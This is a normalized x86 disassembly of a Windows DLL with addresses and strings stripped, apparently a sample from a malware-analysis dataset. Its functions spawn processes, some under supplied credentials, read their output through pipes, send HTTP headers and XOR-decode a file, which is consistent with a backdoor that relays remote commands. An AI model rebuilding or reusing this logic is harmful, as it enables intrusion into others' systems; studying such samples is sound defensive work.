mov [ fs : 0x0 ] eax
xor ebx ebx
mov [ esp + 0x24 ] 0xf
mov [ esp + 0x20 ] ebx
mov [ esp + 0x10 ] bl
push 0x25
push r--data
lea ecx [ esp + 0x14 ]
mov [ esp + 0x13c ] ebx
call sub_10009630
push 0xff
lea eax [ esp + 0x2d ]
push ebx
push eax
mov [ esp + 0x34 ] bl
call sub_1000fe10
mov edi [ esp + 0x1c ]
mov ebx 0x10
add esp 0xc
cmp [ esp + 0x24 ] ebx
jae r-xdata
lea ecx [ esp + 0x28 ]
push ecx
call sub_1000b7b0
lea edx [ esp + 0x28 ]
push edx
push esi
call sub_10004680
add esp 0x8
mov [ esp + 0x134 ] 0xffffffff
cmp [ esp + 0x24 ] ebx
jb r-xdata
lea edi [ esp + 0x10 ]
mov eax 0x1
mov ecx [ esp + 0x12c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ esp + 0x11c ]
xor ecx esp
call sub_1000c0a5
add esp 0x12c
retn
mov eax [ esp + 0x10 ]
push eax
call sub_1000c4b4
add esp 0x4
sub_100076c0
push 0xffffffff
push sub_1001e2d6
mov eax [ fs : 0x0 ]
push eax
sub esp 0xe98
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xe90 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xeac ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0xebc ]
xor ebx ebx
push 0xff
lea eax [ esp + 0x1a9 ]
push ebx
push eax
mov esi ecx
mov [ esp + 0x1b0 ] bl
call sub_1000fe10
push 0xff
lea ecx [ esp + 0x2b5 ]
push ebx
push ecx
mov [ esp + 0x2bc ] bl
call sub_1000fe10
push 0xff
lea edx [ esp + 0xc1 ]
push ebx
push edx
mov [ esp + 0xc8 ] bl
call sub_1000fe10
push 0xff
lea eax [ esp + 0x3cd ]
push ebx
push eax
mov [ esp + 0x3d4 ] bl
call sub_1000fe10
push 0x1fe
lea edx [ esp + 0xcda ]
xor ecx ecx
push ebx
push edx
mov [ esp + 0xce0 ] cx
call sub_1000fe10
push 0x1fe
lea ecx [ esp + 0x6e6 ]
xor eax eax
push ebx
push ecx
mov [ esp + 0x6ec ] ax
call sub_1000fe10
add esp 0x48
push 0x1fe
lea eax [ esp + 0x8aa ]
xor edx edx
push ebx
push eax
mov [ esp + 0x8b0 ] dx
call sub_1000fe10
push 0x1fe
lea edx [ esp + 0xab6 ]
xor ecx ecx
push ebx
push edx
mov [ esp + 0xabc ] cx
call sub_1000fe10
add esp 0x18
lea eax [ esp + 0x1a4 ]
push eax
mov edx r--data
mov ecx esi
call sub_1000b4e0
lea ecx [ esp + 0x2a4 ]
push ecx
mov edx r--data
mov ecx esi
call sub_1000b4e0
lea edx [ esp + 0xa4 ]
push edx
mov edx r--data
mov ecx esi
call sub_1000b4e0
lea eax [ esp + 0x3a4 ]
push eax
mov edx r--data
mov ecx esi
call sub_1000b4e0
push ebx
push ebx
push 0xffffffff
lea ecx [ esp + 0x1b0 ]
mov esi [ MultiByteToWideChar@IAT ]
push ecx
push ebx
push ebx
call esi
push eax
lea edx [ esp + 0xca8 ]
push edx
push 0xffffffff
lea eax [ esp + 0x1b0 ]
push eax
push ebx
push ebx
call esi
push ebx
push ebx
push 0xffffffff
lea ecx [ esp + 0x2b0 ]
push ecx
push ebx
push ebx
call esi
push eax
lea edx [ esp + 0x6a8 ]
push edx
push 0xffffffff
lea eax [ esp + 0x2b0 ]
push eax
push ebx
push ebx
call esi
push ebx
push ebx
push 0xffffffff
lea ecx [ esp + 0xb0 ]
push ecx
push ebx
push ebx
call esi
push eax
lea edx [ esp + 0x8a8 ]
push edx
push 0xffffffff
lea eax [ esp + 0xb0 ]
push eax
push ebx
push ebx
call esi
push ebx
push ebx
push 0xffffffff
lea ecx [ esp + 0x3b0 ]
push ecx
push ebx
push ebx
call esi
push eax
lea edx [ esp + 0xaa8 ]
push edx
push 0xffffffff
lea eax [ esp + 0x3b0 ]
push eax
push ebx
push ebx
call esi
push 0x40
xor eax eax
lea ecx [ esp + 0x2c ]
push ebx
push ecx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] eax
call sub_1000fe10
add esp 0xc
lea edx [ esp + 0x14 ]
push edx
lea eax [ esp + 0x28 ]
mov [ esp + 0x28 ] 0x44
push eax
push ebx
push ebx
push ebx
lea ecx [ esp + 0xab8 ]
push ecx
push ebx
push ebx
lea edx [ esp + 0x6c4 ]
push edx
lea eax [ esp + 0x8c8 ]
push eax
lea ecx [ esp + 0xccc ]
push ecx
call [ CreateProcessWithLogonW@IAT ]
test eax eax
je r-xdata
mov [ esp + 0xa0 ] 0xf
mov [ esp + 0x9c ] ebx
mov [ esp + 0x8c ] bl
mov [ esp + 0xeb4 ] 0x1
call [ GetLastError@IAT ]
push 0xd
push r--data
lea ecx [ esp + 0x90 ]
call sub_10009630
push 0xff
lea edx [ esp + 0x4a9 ]
push ebx
push edx
mov [ esp + 0x4b0 ] bl
call sub_1000fe10
mov edi [ esp + 0x98 ]
mov esi 0x10
add esp 0xc
cmp [ esp + 0xa0 ] esi
jae r-xdata
mov edx [ esp + 0x14 ]
mov esi [ CloseHandle@IAT ]
push edx
call esi
mov eax [ esp + 0x18 ]
push eax
call esi
mov [ esp + 0x84 ] 0xf
mov [ esp + 0x80 ] ebx
mov [ esp + 0x70 ] bl
push 0xe
push r--data
lea ecx [ esp + 0x74 ]
mov [ esp + 0xebc ] ebx
call sub_10009630
push 0xff
lea ecx [ esp + 0x5a9 ]
push ebx
push ecx
mov [ esp + 0x5b0 ] bl
call sub_1000fe10
mov edi [ esp + 0x7c ]
mov esi 0x10
add esp 0xc
cmp [ esp + 0x84 ] esi
jae r-xdata
lea eax [ esp + 0x4a4 ]
push eax
call sub_1000b7b0
lea ecx [ esp + 0x4a4 ]
push ecx
push ebp
call sub_10004680
add esp 0x8
mov [ esp + 0xeb4 ] 0xffffffff
cmp [ esp + 0xa0 ] esi
jb r-xdata
lea edi [ esp + 0x8c ]
lea edx [ esp + 0x5a4 ]
push edx
call sub_1000b7b0
lea eax [ esp + 0x5a4 ]
push eax
push ebp
call sub_10004680
add esp 0x8
mov [ esp + 0xeb4 ] 0xffffffff
cmp [ esp + 0x84 ] esi
jb r-xdata
lea edi [ esp + 0x70 ]
mov eax 0x1
mov ecx [ esp + 0xeac ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0xe90 ]
xor ecx esp
call sub_1000c0a5
add esp 0xea4
retn
mov edx [ esp + 0x8c ]
push edx
mov ecx [ esp + 0x70 ]
push ecx
jmp r-xdata
call sub_1000c4b4
add esp 0x4
sub_10007ae0
push 0xffffffff
push sub_1001e28c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8a0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x898 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8b4 ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x8c4 ]
xor ebx ebx
push 0x3ff
lea eax [ esp + 0x4b1 ]
push ebx
push eax
mov esi ecx
mov [ esp + 0x4b8 ] bl
call sub_1000fe10
push 0xff
lea ecx [ esp + 0x2bd ]
push ebx
push ecx
mov [ esp + 0x2c4 ] bl
call sub_1000fe10
add esp 0x18
lea edx [ esp + 0x4ac ]
push edx
mov edx r--data
mov ecx esi
call sub_1000b4e0
lea eax [ esp + 0x2ac ]
push eax
mov edx r--data
mov ecx esi
call sub_1000b4e0
push 0x3
lea ecx [ esp + 0x2b0 ]
push r--data
push ecx
call sub_1000d320
add esp 0xc
test eax eax
jne r-xdata
push 0x44
lea edx [ esp + 0x28 ]
push ebx
push edx
call sub_1000fe10
add esp 0xc
xor eax eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] eax
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x28 ]
push ecx
push ebx
push ebx
push 0x20
push 0x1
push ebx
push ebx
lea edx [ esp + 0x4cc ]
push edx
push ebx
mov [ esp + 0x4c ] 0x44
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
push 0x103
lea edx [ esp + 0x1a9 ]
push ebx
push edx
mov [ esp + 0x1b0 ] bl
call sub_1000fe10
lea eax [ esp + 0x1b0 ]
push eax
lea ecx [ esp + 0x4bc ]
push r--data
push ecx
call sub_1000d50a
lea edx [ esp + 0x1bc ]
push r--data
push edx
call sub_1000c1e0
add esp 0x20
cmp eax ebx
jne r-xdata
mov [ esp + 0xa0 ] 0xf
mov [ esp + 0x9c ] ebx
mov [ esp + 0x8c ] bl
push 0x16
push r--data
lea ecx [ esp + 0x90 ]
mov [ esp + 0x8c4 ] 0x3
call sub_10009630
push 0xff
lea eax [ esp + 0x3b1 ]
push ebx
push eax
mov [ esp + 0x3b8 ] bl
call sub_1000fe10
mov edi [ esp + 0x98 ]
mov esi 0x10
add esp 0xc
cmp [ esp + 0xa0 ] esi
jae r-xdata
mov eax [ esp + 0x18 ]
mov esi [ CloseHandle@IAT ]
push eax
call esi
mov ecx [ esp + 0x14 ]
push ecx
call esi
push 0x7d0
call [ Sleep@IAT ]
mov [ esp + 0x84 ] 0xf
mov [ esp + 0x80 ] ebx
mov [ esp + 0x70 ] bl
push 0x18
push r--data
lea ecx [ esp + 0x74 ]
mov [ esp + 0x8c4 ] 0x2
call sub_10009630
push 0xff
lea edx [ esp + 0xa9 ]
push ebx
push edx
mov [ esp + 0xb0 ] bl
call sub_1000fe10
mov edi [ esp + 0x7c ]
mov esi 0x10
add esp 0xc
cmp [ esp + 0x84 ] esi
jae r-xdata
push eax
call sub_1000ca66
add esp 0x4
lea eax [ esp + 0x1a4 ]
call sub_10008a60
test eax eax
jne r-xdata
mov [ esp + 0x84 ] 0xf
mov [ esp + 0x80 ] ebx
mov [ esp + 0x70 ] bl
push 0x12
push r--data
lea ecx [ esp + 0x74 ]
mov [ esp + 0x8c4 ] ebx
call sub_10009630
push 0xff
lea eax [ esp + 0xa9 ]
push ebx
push eax
mov [ esp + 0xb0 ] bl
call sub_1000fe10
mov edi [ esp + 0x7c ]
mov esi 0x10
add esp 0xc
cmp [ esp + 0x84 ] esi
jae r-xdata
lea ecx [ esp + 0x3ac ]
push ecx
call sub_1000b7b0
lea edx [ esp + 0x3ac ]
push edx
push ebp
call sub_10004680
add esp 0x8
mov [ esp + 0x8bc ] 0xffffffff
cmp [ esp + 0xa0 ] esi
jb r-xdata
lea edi [ esp + 0x8c ]
lea eax [ esp + 0xa4 ]
push eax
call sub_1000b7b0
lea ecx [ esp + 0xa4 ]
push ecx
push ebp
call sub_10004680
add esp 0x8
mov [ esp + 0x8bc ] 0xffffffff
cmp [ esp + 0x84 ] esi
jb r-xdata
lea edi [ esp + 0x70 ]
mov [ esp + 0x84 ] 0xf
mov [ esp + 0x80 ] ebx
mov [ esp + 0x70 ] bl
mov esi 0x10
push esi
push r--data
lea ecx [ esp + 0x74 ]
mov [ esp + 0x8c4 ] 0x1
call sub_10009630
push 0xff
lea ecx [ esp + 0xa9 ]
push ebx
push ecx
mov [ esp + 0xb0 ] bl
call sub_1000fe10
mov edi [ esp + 0x7c ]
add esp 0xc
cmp [ esp + 0x84 ] esi
jae r-xdata
lea ecx [ esp + 0xa4 ]
push ecx
call sub_1000b7b0
lea edx [ esp + 0xa4 ]
push edx
push ebp
call sub_10004680
add esp 0x8
mov [ esp + 0x8bc ] 0xffffffff
cmp [ esp + 0x84 ] esi
jb r-xdata
lea edi [ esp + 0x70 ]
mov eax 0x1
mov ecx [ esp + 0x8b4 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x898 ]
xor ecx esp
call sub_1000c0a5
add esp 0x8ac
retn
mov eax [ esp + 0x8c ]
mov edx [ esp + 0x70 ]
push edx
jmp r-xdata
lea edx [ esp + 0xa4 ]
push edx
call sub_1000b7b0
lea eax [ esp + 0xa4 ]
push eax
push ebp
call sub_10004680
add esp 0x8
mov [ esp + 0x8bc ] 0xffffffff
cmp [ esp + 0x84 ] esi
jb r-xdata
lea edi [ esp + 0x70 ]
mov eax [ esp + 0x70 ]
jmp r-xdata
call sub_1000c4b4
add esp 0x4
mov ecx [ esp + 0x70 ]
push ecx
jmp r-xdata
push eax
sub_10007f70
push 0xffffffff
push sub_1001e22b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x120
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x11c ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x134 ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x144 ]
push 0x100
xor ebx ebx
push ebx
push rw-data
mov esi ecx
call sub_1000fe10
push 0x100
push ebx
push rw-data
call sub_1000fe10
push 0x100
push ebx
push rw-data
call sub_1000fe10
mov eax [ rw-data ]
add esp 0x24
cmp eax ebx
je r-xdata
push rw-data
mov edx r--data
mov ecx esi
call sub_1000b4e0
push rw-data
mov edx r--data
mov ecx esi
call sub_1000b4e0
push ebx
push ebx
push ebx
push sub_10003560
push ebx
push ebx
call sub_1000d6ff
add esp 0x18
mov [ rw-data ] eax
cmp eax ebx
jne r-xdata
push 0xfa0
push eax
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
jne r-xdata
push ebx
push ebp
call sub_10004680
add esp 0x8
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] ebx
mov [ esp + 0x18 ] bl
push 0x1f
push r--data
lea ecx [ esp + 0x1c ]
mov [ esp + 0x144 ] ebx
call sub_10009630
push 0xff
lea ecx [ esp + 0x35 ]
push ebx
push ecx
mov [ esp + 0x3c ] bl
call sub_1000fe10
mov edi [ esp + 0x24 ]
mov esi 0x10
add esp 0xc
cmp [ esp + 0x2c ] esi
jae r-xdata
mov [ rw-data ] ebx
mov eax [ rw-data ]
push ebx
push eax
call [ TerminateThread@IAT ]
lea edx [ esp + 0x30 ]
push edx
call sub_1000b7b0
lea eax [ esp + 0x30 ]
push eax
push ebp
call sub_10004680
add esp 0x8
mov [ esp + 0x13c ] 0xffffffff
cmp [ esp + 0x2c ] esi
jb r-xdata
lea edi [ esp + 0x18 ]
mov eax 0x1
mov ecx [ esp + 0x134 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x11c ]
xor ecx esp
call sub_1000c0a5
add esp 0x12c
retn
mov ecx [ esp + 0x18 ]
push ecx
call sub_1000c4b4
add esp 0x4
jmp r-xdata
sub_10008120
push 0xffffffff
push sub_1001e107
mov eax [ fs : 0x0 ]
push eax
sub esp 0x480
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x47c ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x494 ]
mov [ fs : 0x0 ] eax
mov ebx [ Sleep@IAT ]
mov edi ecx
xor ebp ebp
mov [ esp + 0x1c ] edi
mov [ esp + 0x14 ] ebp
mov esi 0x3e8
push 0x14000
lea esi [ edi + 0x4 ]
push ebp
push esi
mov [ edi + 0x14004 ] ebp
call sub_1000fe10
mov edi [ ReadFile@IAT ]
add esp 0xc
mov [ esp + 0x18 ] ebp
push esi
call ebx
add esi 0x3e8
cmp esi 0xbb8
jle r-xdata
push 0x0
push r--data
lea ecx [ esp + 0x44 ]
mov [ esp + 0x5c ] 0xf
mov [ esp + 0x58 ] 0x0
mov [ esp + 0x48 ] 0x0
call sub_10009630
xor ebx ebx
mov [ esp + 0x49c ] ebx
cmp [ esp + 0x50 ] ebx
je r-xdata
push 0x0
lea edx [ esp + 0x1c ]
push edx
mov edx [ rw-data ]
mov eax 0x13ffc
sub eax ebp
push eax
lea ecx [ esi + ebp ]
push ecx
push edx
call edi
add ebp [ esp + 0x18 ]
push 0xc8
call ebx
mov ecx [ rw-data ]
push 0x0
lea eax [ esp + 0x18 ]
push eax
push 0x0
push 0x0
push 0x0
push ecx
mov [ esp + 0x2c ] 0x0
call [ PeekNamedPipe@IAT ]
cmp ebp 0x13fc0
jb r-xdata
mov ecx [ rw-data ]
push ebp
lea eax [ esp + 0x18 ]
push eax
push ebp
push ebp
push ebp
push ecx
call [ PeekNamedPipe@IAT ]
cmp [ esp + 0x14 ] ebp
ja r-xdata
cmp [ esp + 0x14 ] ebp
jbe r-xdata
push 0x3
push r--data
lea eax [ esp + 0x44 ]
call sub_10009520
push 0x1
push r--data
lea eax [ esp + 0x44 ]
call sub_10009520
mov eax rw-data
lea edx [ eax + 0x1 ]
nop
push 0x1
push r--data
lea eax [ esp + 0x44 ]
call sub_10009520
cmp [ esp + 0x14 ] 0x0
jbe r-xdata
push ebp
push r--data
lea ecx [ esp + 0x28 ]
mov [ esp + 0x40 ] 0xf
mov [ esp + 0x3c ] ebp
mov [ esp + 0x2c ] 0x0
call sub_10009630
mov [ esp + 0x49c ] 0x4
cmp [ esp + 0x34 ] ebp
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push rw-data
lea eax [ esp + 0x44 ]
call sub_10009520
cmp [ esp + 0x50 ] ebx
je r-xdata
push 0x4
push r--data
lea eax [ esp + 0x28 ]
call sub_10009520
push 0x1
push r--data
lea eax [ esp + 0x28 ]
call sub_10009520
push 0x4
push r--data
lea eax [ esp + 0x28 ]
call sub_10009520
push ebp
call sub_1000def1
push eax
call sub_1000db26
add esp 0x8
call sub_1000db38
cdq
mov ecx 0xf4240
idiv ecx
mov ebp 0x59e074
mov edi r--data
lea esi [ esp + 0x20 ]
add edx 0x1e8480
mov ecx edx
sub ebp edx
call sub_100045a0
mov ecx ebp
mov edi r--data
call sub_100045a0
cmp [ esp + 0x34 ] 0x0
je r-xdata
push 0x1
push r--data
lea eax [ esp + 0x28 ]
call sub_10009520
push 0x3
push r--data
lea eax [ esp + 0x44 ]
call sub_10009520
push 0x1
push r--data
lea eax [ esp + 0x44 ]
call sub_10009520
push 0x4
push r--data
lea eax [ esp + 0x44 ]
call sub_10009520
push ebx
call sub_1000def1
push eax
call sub_1000db26
add esp 0x8
call sub_1000db38
cdq
mov ecx 0x2710
idiv ecx
mov edi r--data
lea esi [ esp + 0x3c ]
add edx 0xbb8
mov ecx edx
call sub_100045a0
mov [ esp + 0x8c ] 0xf
mov [ esp + 0x88 ] ebx
mov [ esp + 0x78 ] bl
mov [ esp + 0x49c ] 0x1
cmp [ esp + 0x14 ] ebx
mov ebx [ esp + 0x40 ]
jbe r-xdata
push 0x1
push r--data
lea eax [ esp + 0x44 ]
call sub_10009520
push 0x3
push r--data
lea eax [ esp + 0x28 ]
call sub_10009520
push 0x1
push r--data
lea eax [ esp + 0x28 ]
call sub_10009520
push 0x4
push r--data
lea eax [ esp + 0x28 ]
call sub_10009520
cmp [ esp + 0x34 ] 0x0
je r-xdata
push 0x1
push r--data
mov eax esi
call sub_10009520
cmp [ esp + 0x54 ] 0x10
jae r-xdata
cmp [ esp + 0x54 ] 0x10
jae r-xdata
push 0x3
push r--data
lea eax [ esp + 0x28 ]
call sub_10009520
push 0x1
push r--data
lea eax [ esp + 0x28 ]
call sub_10009520
mov eax rw-data
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
push 0x1
push r--data
lea eax [ esp + 0x28 ]
call sub_10009520
push r--data
mov edi r--data
lea esi [ esp + 0x5c ]
call sub_10004ad0
add esp 0x4
push 0xffffffff
push 0x0
push eax
lea ecx [ esp + 0x80 ]
mov [ esp + 0x4a8 ] 0x3
call sub_10008f60
mov [ esp + 0x49c ] 0x1
cmp [ esp + 0x70 ] 0x10
jb r-xdata
lea ebx [ esp + 0x40 ]
push r--data
mov edi r--data
lea esi [ esp + 0x5c ]
call sub_10004ad0
add esp 0x4
push 0xffffffff
push 0x0
push eax
lea ecx [ esp + 0x80 ]
mov [ esp + 0x4a8 ] 0x2
call sub_10008f60
mov [ esp + 0x49c ] 0x1
cmp [ esp + 0x70 ] 0x10
jb r-xdata
lea ebx [ esp + 0x40 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push rw-data
lea eax [ esp + 0x28 ]
call sub_10009520
mov ebx [ esp + 0x24 ]
mov ebp 0x10
cmp [ esp + 0x38 ] ebp
jae r-xdata
cmp [ esp + 0x8c ] 0x10
mov eax [ esp + 0x78 ]
jae r-xdata
mov eax [ esp + 0x5c ]
push eax
mov edx [ esp + 0x5c ]
push edx
jmp r-xdata
push r--data
xor edi edi
lea esi [ esp + 0x5c ]
call sub_10004ad0
mov eax [ esp + 0x60 ]
add esp 0x4
cmp [ esp + 0x70 ] ebp
jae r-xdata
lea ebx [ esp + 0x24 ]
mov esi [ esp + 0x1c ]
mov ebx r--data
call sub_1000bc40
xor ebx ebx
push 0x3ff
lea ecx [ esp + 0x95 ]
push ebx
push ecx
mov [ esp + 0x9c ] bl
call sub_1000fe10
push r--data
push r--data
lea edx [ esp + 0xa4 ]
push r--data
push edx
call sub_1000d12a
mov ecx [ esi + 0x14218 ]
mov edi [ HttpAddRequestHeadersA@IAT ]
add esp 0x1c
push 0xa0000000
push 0xffffffff
lea eax [ esp + 0x98 ]
push eax
push ecx
call edi
push 0x3ff
lea edx [ esp + 0x95 ]
push ebx
push edx
mov [ esp + 0x9c ] bl
call sub_1000fe10
push r--data
push r--data
lea eax [ esp + 0xa4 ]
push r--data
push eax
call sub_1000d12a
mov edx [ esi + 0x14218 ]
add esp 0x1c
push 0xa0000000
push 0xffffffff
lea ecx [ esp + 0x98 ]
push ecx
push edx
call edi
push 0x3ff
lea eax [ esp + 0x95 ]
push ebx
push eax
mov [ esp + 0x9c ] bl
call sub_1000fe10
push r--data
push r--data
lea ecx [ esp + 0xa4 ]
push r--data
push ecx
call sub_1000d12a
mov eax [ esi + 0x14218 ]
add esp 0x1c
push 0xa0000000
push 0xffffffff
lea edx [ esp + 0x98 ]
push edx
push eax
call edi
push 0x3ff
lea ecx [ esp + 0x95 ]
push ebx
push ecx
mov [ esp + 0x9c ] bl
call sub_1000fe10
push r--data
push r--data
lea edx [ esp + 0xa4 ]
push r--data
push edx
call sub_1000d12a
add esp 0x1c
push 0xa0000000
push 0xffffffff
lea eax [ esp + 0x98 ]
mov ecx [ esi + 0x14218 ]
push eax
push ecx
call edi
push 0x3ff
lea edx [ esp + 0x95 ]
push ebx
push edx
mov [ esp + 0x9c ] bl
call sub_1000fe10
push r--data
push r--data
lea eax [ esp + 0xa4 ]
push r--data
push eax
call sub_1000d12a
mov edx [ esi + 0x14218 ]
add esp 0x1c
push 0xa0000000
push 0xffffffff
lea ecx [ esp + 0x98 ]
push ecx
push edx
call edi
cmp ebp ebx
jbe r-xdata
lea eax [ esp + 0x78 ]
call sub_1000c4b4
add esp 0x4
mov esi [ esp + 0x1c ]
mov ebx r--data
call sub_1000bc40
xor ebx ebx
push 0x3ff
lea edx [ esp + 0x95 ]
push ebx
push edx
mov [ esp + 0x9c ] bl
call sub_1000fe10
push r--data
push r--data
lea eax [ esp + 0xa4 ]
push r--data
push eax
call sub_1000d12a
mov edx [ esi + 0x14218 ]
mov edi [ HttpAddRequestHeadersA@IAT ]
add esp 0x1c
push 0xa0000000
push 0xffffffff
lea ecx [ esp + 0x98 ]
push ecx
push edx
call edi
push 0x3ff
lea eax [ esp + 0x95 ]
push ebx
push eax
mov [ esp + 0x9c ] bl
call sub_1000fe10
push r--data
push r--data
lea ecx [ esp + 0xa4 ]
push r--data
push ecx
call sub_1000d12a
mov eax [ esi + 0x14218 ]
add esp 0x1c
push 0xa0000000
push 0xffffffff
lea edx [ esp + 0x98 ]
push edx
push eax
call edi
push 0x3ff
lea ecx [ esp + 0x95 ]
push ebx
push ecx
mov [ esp + 0x9c ] bl
call sub_1000fe10
push r--data
push r--data
lea edx [ esp + 0xa4 ]
push r--data
push edx
call sub_1000d12a
mov ecx [ esi + 0x14218 ]
add esp 0x1c
push 0xa0000000
push 0xffffffff
lea eax [ esp + 0x98 ]
push eax
push ecx
call edi
push 0x3ff
lea edx [ esp + 0x95 ]
push ebx
push edx
mov [ esp + 0x9c ] bl
call sub_1000fe10
push r--data
push r--data
lea eax [ esp + 0xa4 ]
push r--data
push eax
call sub_1000d12a
add esp 0x1c
push 0xa0000000
push 0xffffffff
lea ecx [ esp + 0x98 ]
mov edx [ esi + 0x14218 ]
push ecx
push edx
call edi
mov [ esi + 0x1420c ] 0x5
cmp [ esp + 0x70 ] ebp
jb r-xdata
lea eax [ esp + 0x5c ]
mov [ esi + 0x14004 ] ebp
mov [ esi + 0x1420c ] 0x8
mov esi 0x10
mov [ esp + 0x49c ] bl
cmp [ esp + 0x8c ] esi
jb r-xdata
lea eax [ esi + 0x4 ]
mov ecx ebp
mov [ esp + 0x49c ] 0xffffffff
mov [ esp + 0x70 ] 0xf
mov [ esp + 0x6c ] ebx
mov [ esp + 0x5c ] bl
cmp [ esp + 0x38 ] ebp
jb r-xdata
mov eax [ esp + 0x5c ]
push eax
call sub_1000c4b4
add esp 0x4
mov [ esp + 0x49c ] 0xffffffff
mov [ esp + 0x8c ] 0xf
mov [ esp + 0x88 ] ebx
mov [ esp + 0x78 ] bl
cmp [ esp + 0x54 ] esi
jb r-xdata
mov eax [ esp + 0x78 ]
push eax
call sub_1000c4b4
add esp 0x4
xor [ eax ] 0x9d
inc eax
sub ecx 0x1
jne r-xdata
mov eax 0x1
mov ecx [ esp + 0x494 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x47c ]
xor ecx esp
call sub_1000c0a5
add esp 0x48c
retn
mov ecx [ esp + 0x24 ]
mov ecx [ esp + 0x40 ]
jmp r-xdata
push ecx
call sub_1000c4b4
add esp 0x4
sub_10008980
sub esp 0x808
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x804 ] eax
push ebx
push ebp
mov ebp [ esp + 0x814 ]
push esi
push edi
xor eax eax
push 0x7fe
push eax
lea ecx [ esp + 0x1e ]
push ecx
mov [ esp + 0x20 ] ax
call sub_1000fe10
add esp 0xc
xor ebx ebx
jmp r-xdata
push ebp
push 0x400
lea edx [ esp + 0x1c ]
push 0x2
push edx
call sub_1000c497
add esp 0x10
mov [ esp + 0x10 ] eax
xor esi esi
lea edi [ esp + 0x14 ]
nop
shl ebx 0xa
add ebx esi
push 0x0
add ebx ebx
push ebx
push ebp
call sub_1000c96a
push ebp
push 0xf
push 0x2
push r--data
call sub_1000c653
push ebp
call sub_1000ca66
add esp 0x20
mov eax 0x1
jmp r-xdata
inc esi
add edi 0x2
cmp esi 0x3f1
jl r-xdata
mov ecx [ esp + 0x814 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_1000c0a5
add esp 0x808
retn
push 0xf
push r--data
push edi
call sub_1001c906
add esp 0xc
test eax eax
je r-xdata
inc ebx
cmp [ esp + 0x10 ] 0x400
jae r-xdata
push ebp
call sub_1000ca66
add esp 0x4
xor eax eax
sub_10008a60
push esi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0xc0000000
push eax
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push ebx
push 0x0
push 0x0
push 0x0
push 0x4
push 0x0
push esi
call [ CreateFileMappingA@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop esi
retn
push edi
push 0x0
push 0x0
push 0x0
push 0x6
push ebx
call [ MapViewOfFile@IAT ]
mov edi eax
test edi edi
je r-xdata
push esi
call [ CloseHandle@IAT ]
pop ebx
xor eax eax
pop esi
retn
mov edi [ CloseHandle@IAT ]
push ebx
call edi
push esi
call edi
pop edi
pop ebx
xor eax eax
pop esi
retn
push 0x0
push esi
call [ GetFileSize@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov ecx edi
test eax eax
jbe r-xdata
push edi
call [ UnmapViewOfFile@IAT ]
push edi
call [ UnmapViewOfFile@IAT ]
mov edi [ CloseHandle@IAT ]
push ebx
call edi
push esi
call edi
pop edi
pop ebx
mov eax 0x1
pop esi
retn
lea esp [ esp ]
xor [ ecx ] 0x9d
inc ecx
sub eax 0x1
jne r-xdata
sub_10008b20
mov edx [ esp + 0x4 ]
push esi
mov esi ecx
mov eax edx
push edi
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] 0x0
lea edi [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push edx
mov ecx esi
call sub_10009630
pop edi
mov eax esi
pop esi
retn 0x4
sub_10008b60
push esi
mov esi ecx
cmp [ esi + 0x18 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] eax
mov [ esi + 0x4 ] al
pop esi
retn
mov eax [ esi + 0x4 ]
push eax
call sub_1000c4b4
add esp 0x4
sub_10008b90
push ecx
xor eax eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xf
mov [ esp ] eax
mov [ esi + 0x4 ] al
mov eax [ esp + 0x8 ]
push eax
push ecx
push edx
mov ecx esi
call sub_10008f60
mov eax esi
pop ecx
retn 0x4
sub_10008bc0
sub esp 0x18
push ebx
mov ebx [ esp + 0x24 ]
push ebp
mov ebp [ esp + 0x24 ]
mov eax [ ebp + 0x18 ]
push esi
push edi
mov edi [ eax + 0x4 ]
cmp [ edi + 0x45 ] 0x0
mov ecx eax
